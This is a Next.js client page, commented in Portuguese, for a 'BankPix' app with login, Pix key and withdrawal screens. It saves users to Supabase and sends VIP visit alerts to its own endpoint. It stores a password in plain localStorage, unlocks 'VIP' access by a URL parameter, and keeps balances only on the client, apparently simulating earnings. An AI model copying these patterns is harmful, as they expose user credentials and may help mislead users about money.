'use client'

import { useState, useCallback, useEffect, Suspense } from 'react'
import { useSearchParams } from 'next/navigation'
import { LoginScreen } from '@/components/login-screen'
import { AppSidebar } from '@/components/app-sidebar'
import { DashboardView } from '@/components/dashboard-view'
import { CreateKeyView } from '@/components/create-key-view'
import { MyKeysView } from '@/components/my-keys-view'
import { WithdrawalView } from '@/components/withdrawal-view'
import { AccountMenu } from '@/components/account-menu'
import { type PixKey, type Transaction } from '@/lib/store'

type View = 'dashboard' | 'create-key' | 'my-keys' | 'withdrawal'

interface UserData {
  name: string
  phone: string
  password: string
  balance: number
  income: number
  keys: PixKey[]
  transactions: Transaction[]
}

const VIP_PAGE_MARKER = 'vip'

async function salvarUsuarioRealNoBanco(
  fullName: string,
  telefone: string,
  tipoPlano: 'FREE' | 'VIP',
  pushAtivo: boolean = false
): Promise<string | null> {
  try {
    const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL
    const supabaseAnonKey = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY

    if (!supabaseUrl || !supabaseAnonKey) {
      console.error('Variáveis do Supabase não configuradas.')
      return null
    }

    const response = await fetch(
      `${supabaseUrl}/rest/v1/bankpix_users`,
      {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          apikey: supabaseAnonKey,
          Authorization: `Bearer ${supabaseAnonKey}`,
          Prefer: 'resolution=merge-duplicates,return=representation',
        },
        body: JSON.stringify({
          name: fullName.trim(),
          phone: telefone,
          access_type: tipoPlano,
          push_enabled: pushAtivo,
          vip_activated_at: tipoPlano === 'VIP' ? new Date().toISOString() : null
        }),
      },
    )

    if (!response.ok) {
      console.error('Erro ao salvar usuário real:', await response.text())
      return null
    }

    const data = await response.json()
    if (data && Array.isArray(data) && data.length > 0) {
      return data[0].id
    } else if (data && data.id) {
      return data.id
    }
    return null
  } catch (error) {
    console.error('Erro de conexão com o banco:', error)
    return null
  }
}

function MainApp({ vslVersion = '9' }: { vslVersion?: string }) {
  const [isLoggedIn, setIsLoggedIn] = useState(false)
  const [userName, setUserName] = useState('')
  const [userPhone, setUserPhone] = useState('')
  const [balance, setBalance] = useState(0)
  const [income, setIncome] = useState(0)
  const [keys, setKeys] = useState<PixKey[]>([])
  const [transactions, setTransactions] = useState<Transaction[]>([])
  const [currentView, setCurrentView] = useState<View>('dashboard')
  const [showAccountMenu, setShowAccountMenu] = useState(false)

  const searchParams = useSearchParams()
  const isUnlocked = searchParams.get('acesso') === 'vip' || searchParams.get('plano') === 'vip'
  const planoAtual = isUnlocked ? 'VIP' : 'FREE'

  useEffect(() => {
    const url = new URL(window.location.href)
    const isVipPage =
      url.pathname.toLowerCase().includes('/vip') || isUnlocked

    if (!isVipPage) return

    const visitKey = `vip-visit-notified:${url.pathname}`
    if (!sessionStorage.getItem(visitKey)) {
      sessionStorage.setItem(visitKey, 'true')

      void fetch('/api/notify-visit', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          pageType: VIP_PAGE_MARKER,
          url: window.location.href,
          referrer: document.referrer,
          userAgent: navigator.userAgent,
        }),
      }).catch((error) => {
        console.error('[v0] Erro ao enviar alerta VIP:', error)
      })
    }
    // O bloco de envio de email foi totalmente removido daqui.
  }, [isUnlocked])

  useEffect(() => {
    if (!isLoggedIn || !userPhone) return

    const userData: UserData = {
      name: userName,
      phone: userPhone,
      password: '',
      balance,
      income,
      keys,
      transactions,
    }

    const savedUser = localStorage.getItem(`bankpix_user_${userPhone}`)
    if (savedUser) {
      const existingData = JSON.parse(savedUser)
      userData.password = existingData.password
    }

    localStorage.setItem(`bankpix_user_${userPhone}`, JSON.stringify(userData))
  }, [isLoggedIn, userName, userPhone, balance, income, keys, transactions])

  const handleLogin = useCallback(
    async (userData: UserData) => {
      setUserName(userData.name)
      setUserPhone(userData.phone)
      setBalance(userData.balance)
      setIncome(userData.income)
      setKeys(userData.keys || [])
      setTransactions(userData.transactions || [])
      setIsLoggedIn(true)

      const hasPushActive = typeof window !== 'undefined' && 'Notification' in window && Notification.permission === 'granted'

      const userId = await salvarUsuarioRealNoBanco(
        userData.name,
        userData.phone,
        planoAtual,
        hasPushActive
      )

      if (userId && typeof window !== 'undefined') {
        localStorage.setItem('bankpix_user_id', userId)
      }
    },
    [planoAtual],
  )

  const handleLogout = useCallback(() => {
    setIsLoggedIn(false)
    setUserName('')
    setUserPhone('')
    setCurrentView('dashboard')
    setKeys([])
    setTransactions([])
    setBalance(0)
    setIncome(0)
    setShowAccountMenu(false)
  }, [])

  const handleNavigate = useCallback((view: View) => {
    setCurrentView(view)
  }, [])

  const handleAddKey = useCallback((key: PixKey) => {
    setKeys((previousKeys) => [key, ...previousKeys])
  }, [])

  const handleWithdrawal = useCallback(
    (transaction: Transaction) => {
      setBalance((currentBalance) => currentBalance - transaction.amount)
      setTransactions((previousTransactions) => [transaction, ...previousTransactions])
    },
    [],
  )

  if (!isLoggedIn) {
    return (
      <LoginScreen
        onLogin={handleLogin}
        vslVersion={vslVersion}
      />
    )
  }

  return (
    <div className="flex min-h-screen flex-col bg-gray-950 text-white lg:flex-row">
      <AccountMenu
        isOpen={showAccountMenu}
        onClose={() => setShowAccountMenu(false)}
        userName={userName}
        userPhone={userPhone}
      />

      <div className="hidden lg:block">
        <AppSidebar
          currentView={currentView}
          onViewChange={setCurrentView}
          userName={userName}
          userPhone={userPhone}
          onLogout={handleLogout}
          onOpenAccountMenu={() => setShowAccountMenu(true)}
        />
      </div>

      <main className="m-0 min-h-screen w-full p-0 lg:pl-64">
        <div className="w-full p-0 md:p-6 lg:p-8">
          {currentView === 'dashboard' && (
            <DashboardView
              userName={userName}
              balance={balance}
              income={income}
              keys={keys}
              transactions={transactions}
              onNavigate={handleNavigate}
              vslVersion={vslVersion}
            />
          )}

          {currentView === 'create-key' && (
            <CreateKeyView
              userName={userName}
              onAddKey={handleAddKey}
              onBack={() => setCurrentView('dashboard')}
              vslVersion={vslVersion}
            />
          )}

          {currentView === 'my-keys' && (
            <MyKeysView
              keys={keys}
              onCreateKey={() => setCurrentView('create-key')}
              onBack={() => setCurrentView('dashboard')}
            />
          )}

          {currentView === 'withdrawal' && (
            <WithdrawalView
              balance={balance}
              onWithdrawal={handleWithdrawal}
              onBack={() => setCurrentView('dashboard')}
            />
          )}
        </div>
      </main>
    </div>
  )
}

export default function Home(props: { vslVersion?: string }) {
  return (
    <Suspense
      fallback={
        <div className="flex min-h-screen items-center justify-center bg-gray-950 text-white">
          Carregando...
        </div>
      }
    >
      <MainApp {...props} />
    </Suspense>
  )
}
